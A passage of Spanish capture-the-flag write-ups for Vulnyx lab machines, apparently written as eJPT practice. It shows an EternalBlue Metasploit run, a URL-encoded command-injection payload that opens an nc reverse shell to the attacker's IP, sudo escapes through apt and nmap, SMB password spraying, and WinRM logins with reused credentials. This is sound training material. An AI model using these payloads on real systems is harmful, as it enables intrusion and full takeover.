use_pty\n\nUser s3cur4 may run the following commands on exec:\n    (root) NOPASSWD: /usr/bin/apt\n</code></pre> <p>Vemos que podemos ejecutar con privilegios de root el binario apt</p> <p>Buscamos como explotar el binario(GTFObins)</p> <pre><code>This invokes the default pager, which is likely to be less, other functions may apply.\n\nsudo apt changelog apt\n!/bin/sh\n</code></pre> <p>Explotamos el binario</p> <pre><code>s3cur4@exec:/$ cd /usr/bin/\ns3cur4@exec:/usr/bin$ sudo apt changelog apt\nGet:1 https://metadata.ftp-master.debian.org apt 2.6.1 Changelog [505 kB]\nFetched 505 kB in 1s (723 kB/s)\nWARNING: terminal is not fully functional\nPress RETURN to continue \n!/bin/sh\n# whoami\nroot\n</code></pre>"},{"location":"Writeup-ctfs/Vulnyx/Experience/","title":"Experience","text":"<p>\ud83e\udde0 Plataforma: Vulnyx</p> <p>\ud83d\udcbb Sistema operativo: Windows</p> <p>\ud83c\udfaf Nivel: Easy</p> <p>\u2705 Estado: Done</p> <p>\ud83d\udcd8 Curso eJPT: yes</p> <p>\ud83d\uddd3\ufe0f Fecha de creaci\u00f3n: 26 de enero de 2025 15:58</p> <p>\ud83c\udf10 IP: <code>192.168.0.150</code></p>"},{"location":"Writeup-ctfs/Vulnyx/Experience/#recopilacion-de-informacion","title":"Recopilaci\u00f3n de informaci\u00f3n","text":"\ud83d\udca1 Reconocimiento general   <pre><code>sudo arp-scan -I eth0 --localnet\nInterface: eth0, type: EN10MB, MAC: 08:00:27:8e:e8:dc, IPv4: 192.168.0.115\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.0.1 02:10:18:37:9b:14   (Unknown: locally administered)\n192.168.0.91    a0:88:69:69:7d:2d   Intel Corporate\n192.168.0.110   24:2f:d0:54:73:f6   (Unknown)\n192.168.0.150   08:00:27:aa:fb:6c   PCS Systemtechnik GmbH\n\nwhichSystem.py 192.168.0.150                                                                                               \n\n    192.168.0.150 (ttl -&gt; 128): Windows\n</code></pre>"},{"location":"Writeup-ctfs/Vulnyx/Experience/#escaneo-de-puertos","title":"Escaneo de puertos","text":"<p>Comenzamos con un escaneo para identificar que puertos est\u00e1n abiertos.</p> <pre><code>sudo nmap -p- --open -T5 -sS --min-rate 5000 -n -Pn -vvv 192.168.0.150 -oG allports\n\nPORT    STATE SERVICE      REASON\n135/tcp open  msrpc        syn-ack ttl 128\n139/tcp open  netbios-ssn  syn-ack ttl 128\n445/tcp open  microsoft-ds syn-ack ttl 128\nMAC Address: 08:00:27:AA:FB:6C (PCS Systemtechnik/Oracle VirtualBox virtual \n</code></pre>"},{"location":"Writeup-ctfs/Vulnyx/Experience/#enumeracion-de-servicios","title":"Enumeraci\u00f3n de servicios","text":"<p>Una vez listado los puertos accesibles, procederemos a realizar la enumeraci\u00f3n de servicios para su posterior identificaci\u00f3n de vulnerabilidades.</p> <pre><code>sudo nmap -p135,139,445 -sCV 192.168.0.150 -oX targeted.xml\n\nPORT    STATE SERVICE      VERSION\n135/tcp open  msrpc        Microsoft Windows RPC\n139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn\n445/tcp open  microsoft-ds Windows XP microsoft-ds\nMAC Address: 08:00:27:AA:FB:6C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nService Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp\n\nHost script results:\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n|_smb2-time: Protocol negotiation failed (SMB2)\n| smb-os-discovery: \n|   OS: Windows XP (Windows 2000 LAN Manager)\n|   OS CPE: cpe:/o:microsoft:windows_xp::-\n|   Computer name: experience\n|   NetBIOS computer name: EXPERIENCE\\x00\n|   Workgroup: WORKGROUP\\x00\n|_  System time: 2025-03-14T18:21:39-08:00\n|_clock-skew: mean: 12h59m59s, deviation: 5h39m24s, median: 8h59m59s\n|_nbstat: NetBIOS name: EXPERIENCE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:aa:fb:6c (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n</code></pre> <ul> <li>Identificaci\u00f3n de vulnerabilidades</li> </ul> <pre><code>nmap --script=smb-enum-users,smb-os-discovery,smb-enum-shares,smb-enum-groups,smb-enum-domains 192.168.0.150 -p 135,139,445 -v -oN smb_enum.txt\n\nHost script results:\n| smb-enum-shares: \n|   note: ERROR: Enumerating shares failed, guessing at common ones (NT_STATUS_ACCESS_DENIED)\n|   account_used: &lt;blank&gt;\n|   \\\\192.168.0.150\\ADMIN$: \n|     warning: Couldnt get details for share: NT_STATUS_ACCESS_DENIED\n|     Anonymous access: &lt;none&gt;\n|   \\\\192.168.0.150\\C$: \n|     warning: Couldnt get details for share: NT_STATUS_ACCESS_DENIED\n|     Anonymous access: &lt;none&gt;\n|   \\\\192.168.0.150\\IPC$: \n|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED\n|_    Anonymous access: READ\n| smb-os-discovery: \n|   OS: Windows XP (Windows 2000 LAN Manager)\n|   OS CPE: cpe:/o:microsoft:windows_xp::-\n|   Computer name: experience\n|   NetBIOS computer name: EXPERIENCE\\x00\n|   Workgroup: WORKGROUP\\x00\n|_  System time: 2025-03-14T18:24:09-08:00\n</code></pre>"},{"location":"Writeup-ctfs/Vulnyx/Experience/#explotacion","title":"Explotaci\u00f3n","text":"\ud83d\udca1 Probamos diferentes accesos"},{"location":"Writeup-ctfs/Vulnyx/Experience/#explotacion-1","title":"Explotaci\u00f3n 1","text":"<pre><code>msfconsole\nmsf6 &gt; search eteral\n------\n   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption\n   1     \\_ target: Automatic Target                  .                .        .      .\n   2     \\_ target: Windows 7                         .                .        .      .\n   3     \\_ target: Windows Embedded Standard 7       .                .        .      .\n   4     \\_ target: Windows Server 2008 R2            .                .        .      .\n   5     \\_ target: Windows 8                         .                .        .      .\n   6     \\_ target: Windows 8.1                       .                .        .      .\n   7     \\_ target: Windows Server 2012               .                .        .      .\n   8     \\_ target: Windows 10 Pro                    .                .        .      .\n   9     \\_ target: Windows 10 Enterprise Evaluation  .                .        .      .\n   10  exploit/windows/smb/ms17_010_psexec    \n\nmsf6 &gt; use 10\nmsf6 &gt; set LHOST 192.168.0.115\nmsf6 &gt; run\nmeterpreter&gt; shell\nC:\\Documents and Settings&gt;dir\ndir\n Volume in drive C has no label.\n Volume Serial Number is 8842-9464\n\n Directory of C:\\Documents and Settings\n\n01/20/2024  10:38 AM    &lt;DIR&gt;          .\n01/20/2024  10:38 AM    &lt;DIR&gt;          ..\n01/20/2024  07:36 PM    &lt;DIR&gt;          All Users\n01/20/2024  10:38 AM    &lt;DIR&gt;          bill\n               0 File(s)              0 bytes\n               4 Dir(s)   7,833,133,056 bytes free\n\nDirectory of C:\\Documents and Settings\\bill\\Desktop\n\n01/21/2024  11:41 AM    &lt;DIR&gt;          .\n01/21/2024  11:41 AM    &lt;DIR&gt;          ..\n01/21/2024  11:41 AM                35 root.txt\n01/21/2024  11:41 AM                35 user.txt\n               2 File(s)             70 bytes\n               2 Dir(s)   7,833,133,056 bytes free\n\n C:\\Documents and Settings\\bill\\Desktop&gt;type root.txt user.txt\ntype root.txt user.txt\n</code></pre>"},{"location":"Writeup-ctfs/Vulnyx/Experience/#explotacion-2","title":"Explotaci\u00f3n 2","text":"<pre><code>sudo nmap -p445 --script=\"smb-vuln-*\" 192.168.0.150 -v\nPORT    STATE SERVICE\n445/tcp open  microsoft-ds\nMAC Address: 08:00:27:AA:FB:6C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nHost script results:\n| smb-vuln-ms08-067: \n|   VULNERABLE:\n|   Microsoft Windows system vulnerable to remote code execution (MS08-067)\n|     State: LIKELY VULNERABLE\n|     IDs:  CVE:CVE-2008-4250\n|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,\n|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary\n|           code via a crafted RPC request that triggers the overflow during path canonicalization.\n|           \n|     Disclosure date: 2008-10-23\n|     References:\n|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx\n|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250\n|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)\n| smb-vuln-ms17-010: \n|   VULNERABLE:\n|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2017-0143\n|     Risk factor: HIGH\n|       A critical remote code execution vulnerability exists in Microsoft SMBv1\n|        servers (ms17-010).\n|           \n|     Disclosure date: 2017-03-14\n|     References:\n|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx\n|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/\n|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143\n| smb-vuln-cve2009-3103: \n|   VULNERABLE:\n|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2009-3103\n|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,\n|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a\n|           denial of service (system crash) via an &amp; (ampersand) character in a Process ID High header field in a NEGOTIATE\n|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,\n|           aka \"SMBv2 Negotiation Vulnerability.\"\n|           \n|     Disclosure date: 2009-09-08\n|     References:\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103\n|_      http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103\n|_smb-vuln-ms10-054: false\n</code></pre> <ul> <li>Vulnerabilidades:<ul> <li>smb-vuln-ms08-067</li> <li>smb-vuln-ms17-010</li> <li>smb-vuln-cve2009-3103</li> </ul> </li> </ul> <p>Se puede igualmente atacar la maquina con alguna de las vulnerabilidades listadas, a traves de exploits manuales.</p>"},{"location":"Writeup-ctfs/Vulnyx/Experience/#explotacion-posterior","title":"Explotaci\u00f3n posterior","text":"\ud83d\udca1 Accedemos con las credenciales encontradas   <p>Con la ejecucion con metasploit, obtenemos un meterpreter como usuario nt/system, por lo que no es necesario elevar privilegios.</p> <p>privilegios</p>"},{"location":"Writeup-ctfs/Vulnyx/Experience/#conclusion","title":"Conclusi\u00f3n","text":"\ud83d\udca1 Maquina resuelta con Metasploit para practicar de cara al Ejpt"},{"location":"Writeup-ctfs/Vulnyx/HackingStation/","title":"HackingStation","text":"<p>\ud83e\udde0 Plataforma: Vulnyx</p> <p>\ud83d\udcbb Sistema operativo: Linux</p> <p>\ud83c\udfaf Nivel: Easy</p> <p>\u2705 Estado: Done</p> <p>\ud83d\udcd8 Curso eJPT: yes</p> <p>\ud83d\uddd3\ufe0f Fecha de creaci\u00f3n: 13 de abril de 2025 21:16</p> <p>\ud83c\udf10 IP: <code>192.168.0.63</code></p>"},{"location":"Writeup-ctfs/Vulnyx/HackingStation/#recopilacion-de-informacion","title":"Recopilaci\u00f3n de informaci\u00f3n","text":"\ud83d\udca1 Reconocimiento general   <p>Identificamos la red, mediante el fabricante de la MAC (</p> <pre><code>sudo arp-scan -I eth0 --localnet                                                                                                   \ue0b2 \u2714 \ue0b3 21:21:19 \uf017 \ue0b0\nInterface: eth0, type: EN10MB, MAC: 08:00:27:8e:e8:dc, IPv4: 192.168.0.115\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n\n192.168.0.63    08:00:27:a0:16:bd   PCS Systemtechnik GmbH\n</code></pre> <p>Identificamos el sistema operativo. Mediante el TTL de 64, determinamos que es una maquina Linux</p> <pre><code> whichSystem.py 192.168.0.63                                                                                                        \ue0b2 \u2714 \ue0b3 21:21:59 \uf017 \ue0b0\n\n    192.168.0.63 (ttl -&gt; 64): Linux\n</code></pre>"},{"location":"Writeup-ctfs/Vulnyx/HackingStation/#escaneo-de-puertos","title":"Escaneo de puertos","text":"<p>Comenzamos con un escaneo para identificar que puertos est\u00e1n abiertos.</p> <pre><code>sudo nmap -p- --open -T5 -sS --min-rate 5000 -n -Pn -vvv 192.168.0.63 -oG all_ports\n\nPORT   STATE SERVICE REASON\n80/tcp open  http    syn-ack ttl 64\nMAC Address: 08:00:27:A0:16:BD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n</code></pre>"},{"location":"Writeup-ctfs/Vulnyx/HackingStation/#enumeracion-de-servicios","title":"Enumeraci\u00f3n de servicios","text":"<p>Una vez listado los puertos accesibles, procederemos a realizar la enumeraci\u00f3n de servicios para su posterior identificaci\u00f3n de vulnerabilidades.</p> <pre><code>nmap -p80 -sCV 192.168.0.63 -oN targeted \nPORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.57 ((Debian))\n|_http-title: HackingStation\n|_http-server-header: Apache/2.4.57 (Debian)\nMAC Address: 08:00:27:A0:16:BD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n</code></pre> <ul> <li>Identificaci\u00f3n de vulnerabilidades<ul> <li>80/tcp open  http    Apache httpd 2.4.57 ((Debian))</li> </ul> </li> </ul> <p>Enumeramos el puerto 80</p> <p>Encontramos una web </p> <pre><code>&lt;!doctype html&gt;\n&lt;html&gt;\n  &lt;head&gt;\n    &lt;title&gt;HackingStation&lt;/title&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n    &lt;h1&gt;Welcome to HackingStation!&lt;/h1&gt;\n    &lt;img src=\"hacker.jpg\"/&gt;\n    &lt;p&gt;It is still under development but... Use our search engine to find the exploit to hack your victim!&lt;/p&gt;\n    &lt;form action=\"/exploitQuery.php\" method=\"get\"&gt;\n      &lt;ul&gt;\n        &lt;li&gt;\n          &lt;label for=\"product\"&gt;Product on which you want to search for exploits:&lt;/label&gt;\n          &lt;input type=\"text\" id=\"product\" name=\"product\" placeholder=\"Enter the product here...\"&gt;\n          &lt;button type=\"submit\"&gt;Search&lt;/button&gt;\n        &lt;/li&gt;\n      &lt;/ul&gt;\n    &lt;/form&gt;\n    &lt;p&gt;Coming soon to HackingStation... NMAP!!!!!&lt;/p&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>Vemos que para cada busqueda ejecuta una query. El resultado e la busqueda lo muestra de la siguiente manera:</p> <pre><code>http://192.168.0.63/exploitQuery.php?product=test\n[\n    \"{\",\n    \"\\t\\\"SEARCH\\\": \\\"test\\\",\",\n</code></pre> <p>Revisamos las peticiones con Burpsuite. Vemos que la petici\u00f3n se hace mediante GET</p> <pre><code>GET /exploitQuery.php?product=gobuster HTTP/1.1\n\n# Repeater\nHTTP/1.1 200 OK\nDate: Sun, 13 Apr 2025 21:14:59 GMT\nServer: Apache/2.4.57 (Debian)\nVary: Accept-Encoding\nContent-Length: 295\nKeep-Alive: timeout=5, max=100\nConnection: Keep-Alive\nContent-Type: text/html; charset=UTF-8\n\n&lt;pre&gt;[\n    \"{\",\n    \"\\t\\\"SEARCH\\\": \\\"gobuster\\\",\",\n    \"\\t\\\"DB_PATH_EXPLOIT\\\": \\\"\\/snap\\/searchsploit\\/542\\/opt\\/exploitdb\\\",\",\n    \"\\t\\\"RESULTS_EXPLOIT\\\": [\\t],\",\n    \"\\t\\\"DB_PATH_SHELLCODE\\\": \\\"\\/snap\\/searchsploit\\/542\\/opt\\/exploitdb\\\",\",\n    \"\\t\\\"RESULTS_SHELLCODE\\\": [\\t]\",\n    \"}\"\n]&lt;/pre&gt;\n</code></pre> <p>Probamos a inyectar comandos para ver si el parametro product esta sanitizado</p> <pre><code>GET /exploitQuery.php?product=gobuster;whoami \n\nHTTP/1.1 200 OK\nDate: Sun, 13 Apr 2025 21:16:38 GMT\nServer: Apache/2.4.57 (Debian)\nVary: Accept-Encoding\nContent-Length: 309\nKeep-Alive: timeout=5, max=100\nConnection: Keep-Alive\nContent-Type: text/html; charset=UTF-8\n\n&lt;pre&gt;[\n    \"{\",\n    \"\\t\\\"SEARCH\\\": \\\"gobuster\\\",\",\n    \"\\t\\\"DB_PATH_EXPLOIT\\\": \\\"\\/snap\\/searchsploit\\/542\\/opt\\/exploitdb\\\",\",\n    \"\\t\\\"RESULTS_EXPLOIT\\\": [\\t],\",\n    \"\\t\\\"DB_PATH_SHELLCODE\\\": \\\"\\/snap\\/searchsploit\\/542\\/opt\\/exploitdb\\\",\",\n    \"\\t\\\"RESULTS_SHELLCODE\\\": [\\t]\",\n    \"}\",\n    \"hacker\"\n]&lt;/pre&gt;\n</code></pre> <p>Vemos que tenemos un RCE</p>"},{"location":"Writeup-ctfs/Vulnyx/HackingStation/#explotacion","title":"Explotaci\u00f3n","text":"\ud83d\udca1 Probamos diferentes accesos"},{"location":"Writeup-ctfs/Vulnyx/HackingStation/#revershell-via-rce","title":"Revershell via RCE","text":"<p>Probaremos a enviar una rever shell a traves del RCE</p> <pre><code>Rever shell:\n\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 192.168.0.115 4444 &gt;/tmp/f\n\nUrl Encode: \n\nrm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%20192.168.0.115%204444%20%3E%2Ftmp%2Ff\n\nPayload:\n\nget /exploitQuery.php?product=test,rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%20192.168.0.115%204444%20%3E%2Ftmp%2Ff  HTTP/1.1\n</code></pre> <p>Estando en escucha</p> <pre><code>nc -lvnp 4444\nhacker@HackingStation:/var/www/html$ ls\nhacker@HackingStation:/home/hacker$ ls\nls\nsnap\nuser.txt\nhacker@HackingStation:/home/hacker$ cat user.txt\ncat user.txt\ne3***************0a\nhacker@HackingStation:/home/hacker$ \n</code></pre>"},{"location":"Writeup-ctfs/Vulnyx/HackingStation/#explotacion-posterior","title":"Explotaci\u00f3n posterior","text":"\ud83d\udca1 Accedemos con las credenciales encontradas"},{"location":"Writeup-ctfs/Vulnyx/HackingStation/#escalada-de-privilegios","title":"Escalada de privilegios","text":"<p>Enumeramos permisos en la maquina</p> <pre><code> sudo -l\n Matching Defaults entries for hacker on HackingStation:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\n\nUser hacker may run the following commands on HackingStation:\n    (root) NOPASSWD: /usr/bin/nmap        \n</code></pre> <p>Buscamos como podemos explotar el binario nmap mediante GTFObins</p> <pre><code>TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' &gt; $TF\nsudo nmap --script=$TF\n\n# Probamos en la maquina\nhacker@HackingStation:/usr/bin$ TF=$(mktemp)\nTF=$(mktemp)\nhacker@HackingStation:/usr/bin$ echo 'os.execute(\"/bin/sh\")' &gt; $TF\necho 'os.execute(\"/bin/sh\")' &gt; $TF\nhacker@HackingStation:/usr/bin$ sudo nmap --script=$TF\nsudo nmap --script=$TF\nStarting Nmap 7.93 ( https://nmap.org ) at 2025-04-13 23:27 CEST\nNSE: Warning: Loading '/tmp/tmp.GIN6RGxvSI' -- the recommended file extension is '.nse'.\n!sh\n/bin/sh: 1: !sh: not found\nwhoami\nroot\nscript -c bash /dev/null\nroot@HackingStation:~ cd /root \nroot@HackingStation:~ ls\nroot.txt\nsnap\nroot@HackingStation:~ cat root.txt\nf9***********************ad\n</code></pre>"},{"location":"Writeup-ctfs/Vulnyx/HackingStation/#conclusion","title":"Conclusi\u00f3n","text":"\ud83d\udca1 En esta secci\u00f3n, debes proporcionar un resumen de la m\u00e1quina para cuando tengas que volver a ella, puedas saber conocer de forma r\u00e1pida de que se trataba"},{"location":"Writeup-ctfs/Vulnyx/Hosting/","title":"Hosting","text":"<p>\ud83e\udde0 Plataforma: Vulnyx</p> <p>\ud83d\udcbb Sistema operativo: Windows</p> <p>\ud83c\udfaf Nivel: Easy</p> <p>\u2705 Estado: Done</p> <p>\ud83d\udcd8 Curso eJPT: yes</p> <p>\ud83d\uddd3\ufe0f Fecha de creaci\u00f3n: 5 de abril de 2025 17:01</p> <p>\ud83c\udf10 IP: <code>192.168.0.63</code></p>"},{"location":"Writeup-ctfs/Vulnyx/Hosting/#recopilacion-de-informacion","title":"Recopilaci\u00f3n de informaci\u00f3n","text":"\ud83d\udca1 Reconocimiento general   <p>Identificamos el sistema viento que la mac es 08:00 correspondiente a VirtualBox. Identificamos sistema operativo por TTL</p> <pre><code>whichSystem.py 192.168.0.63                                                                                              \n    192.168.0.63 (ttl -&gt; 128): Windows\n</code></pre>"},{"location":"Writeup-ctfs/Vulnyx/Hosting/#escaneo-de-puertos","title":"Escaneo de puertos","text":"<p>Comenzamos con un escaneo para identificar que puertos est\u00e1n abiertos.</p> <pre><code>sudo nmap -p- --open -T5 -sS --min-rate 5000 -n -Pn -vvv 192.168.0.63 -oG targeted\n\nPORT      STATE SERVICE      REASON\n80/tcp    open  http         syn-ack ttl 128\n135/tcp   open  msrpc        syn-ack ttl 128\n139/tcp   open  netbios-ssn  syn-ack ttl 128\n445/tcp   open  microsoft-ds syn-ack ttl 128\n5040/tcp  open  unknown      syn-ack ttl 128\n5985/tcp  open  wsman        syn-ack ttl 128\n7680/tcp  open  pando-pub    syn-ack ttl 128\n47001/tcp open  winrm        syn-ack ttl 128\n49664/tcp open  unknown      syn-ack ttl 128\n49665/tcp open  unknown      syn-ack ttl 128\n49666/tcp open  unknown      syn-ack ttl 128\n49667/tcp open  unknown      syn-ack ttl 128\n49668/tcp open  unknown      syn-ack ttl 128\n49670/tcp open  unknown      syn-ack ttl 128\n49674/tcp open  unknown      syn-ack ttl 128\n</code></pre>"},{"location":"Writeup-ctfs/Vulnyx/Hosting/#enumeracion-de-servicios","title":"Enumeraci\u00f3n de servicios","text":"<p>Una vez listado los puertos accesibles, procederemos a realizar la enumeraci\u00f3n de servicios para su posterior identificaci\u00f3n de vulnerabilidades.</p> <pre><code>sudo nmap -p80,135,139,445,5040,5985,7680,47001,49664,49665,49666,49667,49668,49669,49671 -sCV 192.168.0.63-oN targeted\n\nPORT      STATE  SERVICE       VERSION\n80/tcp    open   http          Microsoft IIS httpd 10.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: IIS Windows\n135/tcp   open   msrpc         Microsoft Windows RPC\n139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp   open   microsoft-ds?\n5040/tcp  open   unknown\n5985/tcp  open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n7680/tcp  open   pando-pub?\n47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n49664/tcp open   msrpc         Microsoft Windows RPC\n49665/tcp open   msrpc         Microsoft Windows RPC\n49666/tcp open   msrpc         Microsoft Windows RPC\n49667/tcp open   msrpc         Microsoft Windows RPC\n49668/tcp open   msrpc         Microsoft Windows RPC\n49669/tcp closed unknown\n49671/tcp closed unknown\nMAC Address: 08:00:27:86:AA:C5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time: \n|   date: 2025-04-05T15:12:12\n|_  start_date: N/A\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled but not required\n|_nbstat: NetBIOS name: HOSTING, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:86:aa:c5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n</code></pre> <p>Whatweb</p> <pre><code>whatweb http://192.168.0.63                                                                                                                             \nhttp://192.168.0.111 [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[192.168.0.63], Microsoft-IIS[10.0], Title[IIS Windows]\n</code></pre> <ul> <li>Identificaci\u00f3n de vulnerabilidades<ul> <li>80 Microsoft-IIS[10.0]</li> </ul> </li> </ul> <p>Hacemos fuzzing para ver si encontramos mas directorios</p> <pre><code>gobuster dir -u http://192.168.0.63/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php,.txt \n\n/speed               (Status: 200) [Size: 168] [--&gt; http://192.168.0.111/speed\n</code></pre> <p>Accedemos a la web y vemos una pagina dedicada al alojamiento web, con una seccion en \u201cTEAM\u201d con diferentes nombres de usuario.</p> <p>Creamos una lista de usuarios con los nombres</p> <pre><code>nano users.txt\np.smith\na.krist\nm.faeny\nk.lendy\n</code></pre>"},{"location":"Writeup-ctfs/Vulnyx/Hosting/#explotacion","title":"Explotaci\u00f3n","text":"\ud83d\udca1 Probamos diferentes accesos"},{"location":"Writeup-ctfs/Vulnyx/Hosting/#smb","title":"SMB","text":"<p>Al disponer de posibles credenciales de acceso, intentamos usarlos con el modulo de metasploit SMB_login</p> <pre><code>msf6&gt; search smb_login\nmsf6&gt; use use auxiliary/scanner/smb/smb_login\nmsf6&gt; set RHOSTS 192.168.0.63\nmsf6&gt; set USER_FILE users.txt\nmsf6&gt; set PASS_FILE /usr/share/wordlist/rockyou\n\nEncontramos  credenciales v\u00e1lidas para \np.smith:k****\n</code></pre> <p>Probamos a enumerar recursos con este usuario</p> <pre><code>smbmap -u \"p.smith\" -p \"kissme\" -H 192.168.0.63 \n[+] IP: 192.168.0.63:445    Name: hosting.nyx           Status: Authenticated\n    Disk                                                    Permissions Comment\n    ----                                                    ----------- -------\n    ADMIN$                                              NO ACCESS   Admin remota\n    C$                                                  NO ACCESS   Recurso predeterminado\n    IPC$                                                READ ONLY   IPC remota\n</code></pre> <p>Enumeramos con crackmapexec usuarios</p> <p>(https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/)</p> <pre><code>crackmapexec  smb 192.168.0.63 -u 'p.smith' -p 'k***' --users \nSMB         192.168.0.111   445    HOSTING          HOSTING\\Administrador                  \nSMB         192.168.0.111   445    HOSTING          HOSTING\\administrator                  \nSMB         192.168.0.111   445    HOSTING          HOSTING\\DefaultAccount                 \nSMB         192.168.0.111   445    HOSTING          HOSTING\\f.miller                       \nSMB         192.168.0.111   445    HOSTING          HOSTING\\Invitado                       \nSMB         192.168.0.111   445    HOSTING          HOSTING\\j.wilson                       \nSMB         192.168.0.111   445    HOSTING          HOSTING\\m.davis                        H0$T1nG123!\nSMB         192.168.0.111   445    HOSTING          HOSTING\\p.smith                        \nSMB         192.168.0.111   445    HOSTING          HOSTING\\WDAGUtilityAccount            \n</code></pre> <p>Aparece un password asociado a un usuario. Tratamos de enumerar con ese usuario, pero da error para SMB</p> <pre><code>crackmapexec  smb 192.168.0.63 -u 'm.davis' -p 'H0$T1nG123!\nSMB         192.168.0.63    445    HOSTING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:HOSTING) (domain:HOSTING) (signing:False) (SMBv1:False)\nSMB         192.168.0.63    445    HOSTING          [-] HOSTING\\m.davis:H0$T1nG123! STATUS_LOGON_FAILURE \n</code></pre> <p>Al tener un password asociado a alguna cuenta, tratamos de ver si alguno permite acceso con winrm ya que esta el puerto abierto</p> <pre><code> crackmapexec  winrm 192.168.0.63 -u 'm.davis' -p 'H0$T1nG123!'  \n\nSMB         192.168.0.63    5985   HOSTING          [*] Windows 10 / Server 2019 Build 19041 (name:HOSTING) (domain:HOSTING)\nHTTP        192.168.0.63    5985   HOSTING          [*] http://192.168.0.63:5985/wsman\nWINRM       192.168.0.63    5985   HOSTING          [-] HOSTING\\m.davis:H0$T1nG123!\n\n crackmapexec  winrm 192.168.0.63 -u 'j.wilson' -p 'H0$T1nG123!'  \nSMB         192.168.0.63    5985   HOSTING          [*] Windows 10 / Server 2019 Build 19041 (name:HOSTING) (domain:HOSTING)\nHTTP        192.168.0.63    5985   HOSTING          [*] http://192.168.0.63:5985/wsman\nWINRM       192.168.0.63    5985   HOSTING          [+] HOSTING\\j.wilson:H0$T1nG123! (Pwn3d!)\n</code></pre> <p>Tenemos acceso con el usauri j.wilson</p> <pre><code>evil-winrm -i 192.168.0.63 -u 'j.wilso'n -p 'H0$T1nG123!'\n*Evil-WinRM* PS C:\\Users\\j.wilson\\Documents&gt; \n*Evil-WinRM* PS C:\\Users\\j.wilson&gt; cd desktop\n*Evil-WinRM* PS C:\\Users\\j.wilson\\desktop&gt; dir\n\n    Directorio: C:\\Users\\j.wilson\\desktop\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a----          9/2/2024   7:14 PM             70 user.txt\n\n*Evil-WinRM* PS C:\\Users\\j.wilson\\desktop&gt; type user.txt\n50e5a*******************************\n</code></pre>"},{"location":"Writeup-ctfs/Vulnyx/Hosting/#explotacion-posterior","title":"Explotaci\u00f3n posterior","text":"\ud83d\udca1 Accedemos con las credenciales encontradas"},{"location":"Writeup-ctfs/Vulnyx/Hosting/#escalada-de-privilegios","title":"Escalada de privilegios","text":"<p>Habiendo accedido como usuario j.wilson , ahora vamos a escalar privilegios. Para ello , revisamos que permisos tiene el usuario</p> <pre><code>*Evil-WinRM* PS C:\\Users\\j.wilson\\desktop&gt; net user j.wilson\nMiembros del grupo local                   *Operadores de copia 